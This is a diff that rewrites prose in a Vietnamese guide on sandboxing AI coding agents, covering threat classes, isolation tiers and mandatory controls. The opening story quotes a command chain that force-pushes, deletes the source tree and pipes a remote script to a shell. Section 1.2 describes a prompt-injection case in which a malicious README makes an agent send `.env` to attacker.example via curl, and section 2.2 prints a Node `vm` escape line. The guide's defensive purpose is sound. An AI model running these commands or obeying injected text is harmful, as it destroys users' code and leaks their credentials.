@@ -74,24 +74,24 @@
 ### Opening Story
 
 03:12 giờ sáng. Một coding agent đang refactor authentication qua 40 file. Model đọc
-sai một dòng và sinh ra:
+lệch một dòng và nhả ra câu lệnh này:
 
 ```bash
 git push --force origin main && rm -rf ./src && curl -s https://pastebin.example/x.sh | sh
 ```
 
-Không ai thức. Không có prompt approval nào hiện ra. Lệnh chạy trên một laptop chứa
-`~/.ssh/id_ed25519`, `~/.aws/credentials` và file `.env` giữ DATABASE_URL production.
-03:14, repo biến mất, deploy key đã bị đánh cắp, token trong `.env` đang xoay vòng
-trong máy chủ của người khác ở nước ngoài.
+Không ai còn thức. Không có hộp approval nào hiện lên. Câu lệnh chạy ngay trên laptop
+chứa `~/.ssh/id_ed25519`, `~/.aws/credentials` và file `.env` giữ DATABASE_URL production.
+03:14, repo bay màu, deploy key bị cuỗm, token trong `.env` bắt đầu xoay vòng
+trên máy chủ của người lạ ở nước ngoài.
 
-**Không ai ác ý.** Model không bị hack. Đây chỉ là một mẫu xác suất từ dự đoán
-token kế tiếp gặp một tầng thực thi không có rào chắn nào.
+**Chẳng ai cố ý phá.** Model cũng không bị hack. Đây chỉ là một lần dự đoán
+token kế tiếp bị trượt, rơi đúng vào tầng thực thi không có rào chắn nào.
 
-**Đó chính là toàn bộ lập luận ủng hộ sandboxing.** Không phải "để chống hacker" —
-mà để **chặn bán kính ảnh hưởng của lỗi**. Agent của bạn là một hệ thống xác suất,
-thỉnh thoảng sẽ sai một cách tự tin; một máy sinh code sai mà có shell là một khẩu
-súng đã lên đạn, hướng vào máy của bạn.
+**Đó là toàn bộ lý do sandbox phải tồn tại.** Không phải để "chống hacker" —
+mà để **nhốt gọn hậu quả khi có sự cố**. Agent của bạn chạy bằng xác suất,
+thỉnh thoảng sẽ tự tin làm sai; một cỗ máy sinh code sai mà được cầm shell
+thì chẳng khác nào khẩu súng đã lên đạn, chĩa thẳng vào máy của bạn.
 
 ### Vì Sao Sandboxing Là Bắt Buộc?
 
@@ -106,9 +106,9 @@ súng đã lên đạn, hướng vào máy của bạn.
 | Agent LLM đã test kỹ | frontier | ~99.9% | **100 lệnh phá hoại** |
 | Model nhỏ / local (7B) | local | ~97% | **3.000 lệnh phá hoại** |
 
-Một hệ thống tin cậy 99,9% là *máy phát thảm họa* khi chạy 100.000 lần. Đây chính
-là lập luận đứng sau hộp số tự động, dây đai an toàn và transaction database:
-**lỗi cá nhân là điều tất yếu, nên hệ thống phải được thiết kế như thể nó sẽ xảy ra.**
+Một hệ thống đúng 99,9% mà chạy 100.000 lần thì vẫn là *máy đẻ sự cố*. Đây cũng là
+lý lẽ đứng sau hộp số tự động, dây đai an toàn và transaction database:
+**lỗi của con người là chuyện trước sau, nên hệ thống phải được thiết kế như thể nó chắc chắn sẽ xảy ra.**
 
 #### Triết lý cốt lõi
 
@@ -117,8 +117,8 @@ Sandbox ≠ "anh ninh tinh thần" chống kẻ tấn công không tin cậy
 Sandbox = bộ giới hạn bán kính ảnh hưởng quanh "mô hình được cấp quyền nhưng không hoàn hảo"
 ```
 
-Mối đe dọa không phải một quốc gia. Mối đe dọa là một mẫu `temperature=0.7` tổng
-quát hóa sai từ ba dòng context.
+Mối đe dọa không phải một cường quốc nào. Mối đe dọa là một mẫu `temperature=0.7`
+suy luận lệch chỉ vì thiếu ba dòng context.
 
 ## Overview
 
@@ -128,9 +128,9 @@ quát hóa sai từ ba dòng context.
 > - **So sánh:** Như một phòng thí nghiệm chống lây. Đối tượng nghiên cứu (output mô hình) thực sự nguy hiểm — không phải ác ý, mà là *có khả năng*. Găng tay, phòng kín, vòi khử trùng (redaction), phòng khóa áp (approval) tồn tại để một sự cố rò rỉ vẫn sống sót.
 > - **Vì sao quan trọng:** Một agent có thể đọc SSH key của bạn, ra internet, và chạy mãi thì là một khẩu súng lên đạn với kẹt giậ. Sandboxing biến "mất tất cả" thành "chạy thất bại".
 
-**Sandbox Execution** là thực hành chạy mọi đoạn code không tin cậy do mô hình sinh ra
-bên trong môi trường bị ràng buộc, mục đích duy nhất làm cho thất bại trở nên
-chịu đựng được.
+**Sandbox Execution** là thói quen chạy mọi đoạn code không tin cậy do model sinh ra
+bên trong một môi trường bị rào kỹ, với một mục đích duy nhất là làm cho thất bại
+trở nên chịu đựng được.
 
 ```
 ┌─────────────────────────── HOST (tin cậy) ───────────────────────────┐
@@ -159,9 +159,9 @@ chịu đựng được.
                         ▼  ──────────────► về lại HOST
 ```
 
-**Quy tắc làm cho nó hoạt động:** sandbox chạy với **ít đặc quyền hơn supervisor**.
-Hầu hết sự cố thực tế đến từ lỗi đối xứng đặc quyền — sandbox tới được thứ nó
-không nên tới được.
+**Luật chơi làm cho mọi thứ hiệu quả:** sandbox luôn chạy với **ít quyền hơn supervisor**.
+Hầu hết sự cố ngoài đời đều bắt nguồn từ chỗ mất cân đối này — sandbox với được
+tới chỗ mà lẽ ra nó không bao giờ được chạm vào.
 
 ## Mục Lục Chi Tiết
 
@@ -190,9 +190,9 @@ không nên tới được.
 
 ### 1.1 Thực ra ta đang giam cái gì?
 
-Đối tượng giam giữ **không phải người dùng**. Đó là *output* của một hệ thống ngẫu
-nhiên vận hành không có đặc tả hình thức. Hãy trả lời bốn câu hỏi trước khi thiết kế
-bất kỳ control nào:
+Người bị nhốt ở đây **không phải người dùng**. Đó là *output* của một hệ ngẫu nhiên
+chạy mà không có đặc tả hình thức. Trước khi dựng bất kỳ control nào, bạn hãy trả lời
+bốn câu hỏi này đã:
 
 | Câu hỏi | Vì sao quan trọng | Trả lời ở đâu |
 |---------|------------------|---------------|
@@ -201,7 +201,7 @@ bất kỳ control nào:
 | **Có thể tới đâu?** | Internet, dịch vụ nội bộ, package registry, metadata endpoint | Control 2 |
 | **Cái gì không hoàn tác được?** | Xoá, force-push, migration, tin nhắn đi ra ngoài | Gate (→ `15-approval-gates/`) |
 
-Một control không ánh xạ được với một trong bốn câu hỏi này thì chỉ là đồ trang trí.
+Một control mà không trả lời được một trong bốn câu hỏi này thì chỉ để trang trí.
 
 ### 1.2 Sáu lớp mối đe dọa
 
@@ -214,15 +214,15 @@ Một control không ánh xạ được với một trong bốn câu hỏi này 
 | T5 | **Supply chain** | `pip install evil-pkg` lúc chạy | Registry bị chiếm hoặc typosquat | Image đóng băng, mirror allowlist |
 | T6 | **Isolation escape** | Mount `/proc`, `--privileged`, host socket | Cấu hình sai, không phải ác ý | Cap-drop, seccomp, gVisor |
 
-**T2 đáng để ý đặc biệt:** prompt injection biến code *hợp lệ* thành công cụ tấn
-công. Một agent đã sandbox đọc một README độc hại rồi chạy
-`curl attacker.example/$(cat .env | base64)` vẫn *hoàn toàn nằm trong quyền của nó* —
-lỗi nằm ở chỗ những quyền đó quá rộng. Vì vậy Control 2 (net) và Control 5 (secret)
-không thể thương lượng kể cả khi mọi thứ khác đều ổn.
+**T2 đáng soi kỹ:** prompt injection biến code *trông hợp lệ* thành công cụ tấn
+công. Một agent đã sandbox đọc phải một README độc hại rồi chạy
+`curl attacker.example/$(cat .env | base64)` thì vẫn *nằm trong quyền hợp lệ của nó* —
+lỗi ở đây là ngay từ đầu ta đã cho nó quá nhiều quyền. Vì vậy Control 2 (net) và Control 5 (secret)
+là hai chốt không được mặc cả, kể cả khi mọi thứ khác trông đều ổn.
 
 ### 1.3 Bản Đồ Blast Radius
 
-Xếp cường độ cách ly theo thứ mà một lần escape chạm tới:
+Bạn xếp độ cách ly theo câu hỏi: nếu bị thoát một lần thì thiệt hại lan tới đâu:
 
 ```
  Tầng 0  eval() trong process    →  toàn bộ host, mọi secret, mọi tenant
@@ -233,10 +233,7 @@ Xếp cường độ cách ly theo thứ mà một lần escape chạm tới:
  Tầng 5  Cách ly thay đổi        →  chỉ *diff* lọt ra, không phải thực thi
 ```
 
-**Hướng dẫn thiết kế:** giá của một lần escape phải vượt giá trị mục tiêu. Kẻ tấn
-công bị sandbox ở Tầng 1 trong 30 giây với laptop chứa 200 USD credit cloud sẽ
-thắng. Cùng kẻ đó ở Tầng 4 trong 30 giây không có secret, không mạng, và trần RAM
-2 GB thì không.
+**Cách dùng bản đồ này:** giá của một lần thoát phải đắt hơn giá trị mà kẻ tấn công nhắm tới. Kẻ xấu bị nhốt ở Tầng 1 trong 30 giây với laptop chứa 200 USD credit cloud thì vẫn lời to. Cũng kẻ đó mà bị nhốt ở Tầng 4 trong 30 giây, không secret, không mạng, trần RAM 2 GB thì chẳng làm ăn được gì.
 
 ---
 
@@ -253,8 +250,8 @@ thắng. Cùng kẻ đó ở Tầng 4 trong 30 giây không có secret, không m
 | 4 | MicroVM (Firecracker, Fly Machines) | ~125 ms + snapshot | rất cao | host escape, noisy neighbor | trung bình | ✅ public/multi-tenant |
 | 5 | Cách ly thay đổi (worktree + patch consensus) | ~10 ms | không áp dụng | edit dở lọt vào main | rất thấp | ✅ luôn, như một lớp |
 
-Các tầng cộng lại với nhau. Setup production kiểu Claude Code thường chạy
-**Tầng 2 + Tầng 5**; dịch vụ thực thi code công cộng chạy **Tầng 4 + Tầng 2 + Tầng 5**.
+Các tầng này cộng dồn với nhau. Setup production kiểu Claude Code thường đánh
+**Tầng 2 + Tầng 5**; dịch vụ chạy code công cộng thì chơi chắc **Tầng 4 + Tầng 2 + Tầng 5**.
 
 ### 2.2 Tầng 1 — Cách ly ở tầng ngôn ngữ
 
@@ -266,19 +263,19 @@ const ctx = vm.createContext({ /* không kế thừa gì */ });
 vm.runInContext("this.constructor.constructor('return process')()", ctx);
 ```
 
-Dòng đó escape ra `process` thật. `vm` là một **namespace**, không phải **ranh giới
-bảo mật** — tài liệu Node nói rõ điều đó. `RestrictedPython` chặt hơn nhưng chỉ canh
-AST; code sinh ra gọi `exec`, `os.system` hay `import subprocess` là đi ra ngoài ngay.
+Dòng đó thoát thẳng ra `process` thật. `vm` chỉ là một **không gian tên**, không phải **ranh giới
+bảo mật** — tài liệu Node cũng nói thẳng như vậy. `RestrictedPython` siết chặt hơn nhưng cũng chỉ canh
+ở tầng AST; code sinh ra mà gọi `exec`, `os.system` hay `import subprocess` là đi xuyên qua ngay.
 
-**Dùng Tầng 1 để:** unit test logic chọn tool, replay xác định các hàm thuần, prototype
-code-mode chưa chạm input không tin cậy.
+**Khi nào dùng Tầng 1:** test logic chọn tool, chạy lại các hàm thuần một cách xác định, thử nghiệm
+code-mode khi chưa đụng tới input không tin cậy.
 
 **Không bao giờ dùng Tầng 1 cho:** bất cứ thứ gì sẽ chạy trên máy người dùng có credential.
 
 ### 2.3 Tầng 2 — Cách ly bằng Container
 
-Tầng làm việc chính. Lập luận bảo mật không phải "Docker không thể bị phá" — mà là
-"thoát ra cần một exploit kernel, và ta đã dọn sạch các mục tiêu dễ ăn".
+Tầng này là chỗ làm việc chính mỗi ngày. Lý lẽ bảo mật không phải "Docker không thể bị phá" — mà là
+"muốn thoát ra phải dùng tới exploit kernel, trong khi ta đã dọn sạch mấy món dễ xơi".
 
 ```bash
 docker run --rm \
@@ -294,22 +291,22 @@ docker run --rm \
   sandbox-img@sha256:9f2c…              # digest, không phải tag
 ```
 
-Chín cờ, và **sự kết hợp** mới là sản phẩm. `--network=none` vô nghĩa nếu đặt cạnh
-`--privileged`. `--read-only` vô nghĩa nếu mount socket của host.
+Chín lá cờ, và **phải đi chung với nhau** mới thành sản phẩm. `--network=none` sẽ vô nghĩa nếu đặt cạnh
+`--privileged`. `--read-only` cũng vô nghĩa nếu bạn mount cả socket của host vào.
 
 ### 2.4 Tầng 3 — Lọc Syscall (gVisor / Kata)
 
-gVisor (`runsc`) chèn một application kernel ở userspace giữa container và host
-kernel. Syscall được xử lý bằng code Go; host kernel chỉ thấy bề mặt nhỏ hơn nhiều
-và đã được audit.
+gVisor (`runsc`) nhét một application kernel chạy ở userspace vào giữa container và host
+kernel. Syscall được xử lý bằng code Go; host kernel chỉ còn thấy một bề mặt nhỏ hơn nhiều
+và đã được rà soát kỹ.
 
 ```bash
 docker run --runtime=runsc …  # cùng image, cùng cờ, khác runtime
 ```
 
 - **Chi phí:** giảm throughput 20–60%, memory tăng nhẹ.
-- **Đổi lại:** một primitive escape của container không còn nhắm thẳng vào host kernel.
-- **Đổi chỗ:** đổi runtime chỉ là đổi cờ. Đây là nâng cấp cách ly rẻ nhất mà hệ thống đang có thể làm.
+- **Được lại:** một pha thoát khỏi container giờ không còn chĩa thẳng vào host kernel.
+- **Đổi chỗ:** chuyển runtime chỉ là đổi một lá cờ. Đây là món nâng cấp cách ly rẻ nhất mà hệ thống của bạn có thể làm ngay.
 
 ### 2.5 Tầng 4 — Cách Ly MicroVM
 
@@ -339,10 +336,10 @@ git worktree add ../wt-$RUN_ID -b agent/$RUN_ID
 # agent làm việc trong ../wt-$RUN_ID; nhánh main không bao giờ dịch chuyển
 ```
 
-Agent có thể hủy diệt worktree của mình mà không hề hấn. Khi xong, harness diff, rồi
-một con người hoặc reviewer agent duyệt patch. Đây là lý do một lần sandbox escape
-trở nên *chịu đựng được* thay vì *thảm họa*: kịch bản xấu nhất đơn vị là "mất một
-lượt chạy", không phải "mất repository".
+Agent phá banh worktree của riêng mình cũng chẳng sao. Khi xong việc, harness ngồi diff, rồi
+một người hoặc reviewer agent duyệt patch. Đó là lý do một lần thoát sandbox
+trở thành chuyện *chịu được* thay vì *toang cả repo*: kịch bản tệ nhất của một lượt chạy chỉ là "mất một
+lượt chạy", chứ không phải "mất repository".
 
 ### 2.7 Chọn Tầng Nào?
 
@@ -358,8 +355,8 @@ lượt chạy", không phải "mất repository".
 
 ## 3. Năm Controls Bắt Buộc
 
-Controls 1–5 không phải danh sách mong muốn. Sandbox thiếu bất kỳ cái nào đều chỉ là
-một shell được bọc thêm cho có.
+Controls 1–5 không phải danh sách gợi ý cho vui. Sandbox mà thiếu một cái thì thực chất chỉ là
+một cái shell khoác thêm áo choàng.
 
 ### 3.1 Control 1 — Filesystem Allowlist
 
@@ -657,8 +654,8 @@ Kiểm tra trước realpath là kiểm tra sai chuỗi.
 
 ### 5.1 Sandbox MCP Server
 
-MCP server là process sống lâu, có định nghĩa tool — mục tiêu giá trị cao nhất trong
-harness. Quy tắc:
+MCP server là process sống lâu, ôm cả định nghĩa tool — miếng mồi giá trị nhất trong
+cả harness. Luật chơi:
 
 1. **Một server, một sandbox, một role.** Không bao giờ chia sẻ process server giữa các tenant.
 2. **Ghim image bằng digest**; một tag registry bị chiếm là chiếm toàn bộ harness.
@@ -917,7 +914,7 @@ export async function runDrills(): Promise<boolean> {
 
 ### 8.3 Playbook Khi Escape
 
-Khi một drill fail, câu trả lời **không bao giờ** là "thêm `--privileged`".
+Khi một drill rớt, câu trả lời **không bao giờ** là quăng thêm `--privileged` cho qua chuyện.
 
 1. **Tái hiện** đúng bộ cờ trong config bị lỗi.
 2. **Phân loại** — đặc quyền, mount, kernel, tài nguyên, mạng, hay image.
@@ -929,7 +926,7 @@ Khi một drill fail, câu trả lời **không bao giờ** là "thêm `--privil
 
 ## 9. Observability & Audit
 
-Mỗi lần gọi sandbox là một trajectory event (→ `13-trajectory-observability/`):
+Mỗi lần gọi sandbox là một trajectory event (→ `13-trajectory-observability/`), bạn đọc như nhật ký hành trình:
 
 ```json
 {
@@ -964,22 +961,22 @@ replay (→ 13) không hợp lệ.
 
 ### 10.1 SWE-agent — Một Container Cho Mỗi Instance
 
-SWE-agent bọc toàn bộ vòng lặp agent trong một container Docker cho mỗi task instance
-(`--network none`, repo được mount, tool nướng sẵn). Bài học thiết kế:
+SWE-agent nhốt toàn bộ vòng lặp agent trong một container Docker cho mỗi task
+(`--network none`, mount repo vào, tool nướng sẵn trong image). Bài học thiết kế:
 
-- **Một container cho cả run.** Thay vì container mỗi tool call, *run* là đơn vị cách ly. Rẻ, và container cũng là ranh giới transcript.
-- **Môi trường nướng vào image.** Agent không bao giờ cài gì; tác giả harness đã tuyển image. Loại bỏ hoàn toàn rủi ro supply chain lúc chạy.
-- **Mạng tắt.** Task SWE-bench vốn offline nên `network=none` là miễn phí.
+- **Một container cho cả lượt chạy.** Thay vì mỗi tool call một container, *lượt chạy* mới là đơn vị cách ly. Vừa rẻ, container vừa là ranh giới của cả transcript.
+- **Môi trường nướng sẵn trong image.** Agent không bao giờ tự cài gì; người làm harness đã chọn image giùm. Nhờ vậy rủi ro supply chain lúc chạy biến mất.
+- **Cắt mạng.** Task SWE-bench vốn offline nên `network=none` là được miễn phí.
 
-Đánh đổi: không mạng nghĩa là không có tài liệu trực tiếp, nên harness phải tiêm tài
-liệu liên quan vào context (→ `01`, `02`).
+Đánh đổi: không mạng nghĩa là không đọc tài liệu trực tiếp được, nên harness phải tiêm tài
+liệu liên quan vào context trước (→ `01`, `02`).
 
 ### 10.2 OpenHands — Docker Runtime Mỗi Session
 
-OpenHands tham số hóa runtime sau một interface, Docker là mặc định và có runtime
-dựa trên Kubernetes cho triển khai lớn hơn. Bài học là **cách ly có thể cắm được**:
-agent core không hề import `child_process`; nó hỏi một `Runtime` rằng
-`run(cmd) → result`. Đổi Docker → gVisor → E2B là đổi cấu hình, không phải viết lại.
+OpenHands cho phép cắm đổi runtime sau một interface, Docker là mặc định và có thêm runtime
+dựa trên Kubernetes cho triển khai lớn hơn. Bài học ở đây là **cách ly mà cắm được như phích điện**:
+agent core không hề `import child_process`; nó chỉ hỏi một `Runtime` rằng
+`run(cmd) → result`. Muốn đổi Docker → gVisor → E2B thì đổi config, khỏi viết lại code.
 
 ### 10.3 E2B / Firecracker — MicroVM dạng SaaS
 
@@ -988,8 +985,8 @@ E2B đóng gói microVM Firecracker thành một SDK: `sandbox = await Sandbox.c
 nhận một microVM khôi phục từ snapshot, cho cold start ~100 ms với cách ly cấp
 hypervisor. Bề mặt API cố tình nhỏ — **chính SDK là policy**.
 
-Đây là mẫu nên sao chép khi cần cách ly mạnh mà không muốn tự xây: mua Tầng 4, dồn
-công sức vào Tầng 5 (patch consensus) và trải nghiệm approval.
+Đây là mẫu đáng sao chép khi bạn cần cách ly chắc mà không muốn tự xây: mua Tầng 4 cho khỏe, rồi dồn
+sức vào Tầng 5 (patch consensus) và trải nghiệm approval cho mượt.
 
 ### 10.4 Claude Code — Permission Mode & Bash Được Sandbox
 
@@ -1228,5 +1225,5 @@ trong transparency log, và bộ escape drill liên tục chạy trong productio
 
 *Tài liệu: Harness 12. Sandbox Execution — HARNESS ENGINEERING EDITION*
 *Module cross-cutting · nhà chính thức của khái niệm sandbox*
-*Cập nhật: 19/07/2026*
+*Cập nhật: 16/10/2026*
 *Tác giả: AI Knowledge Repository*
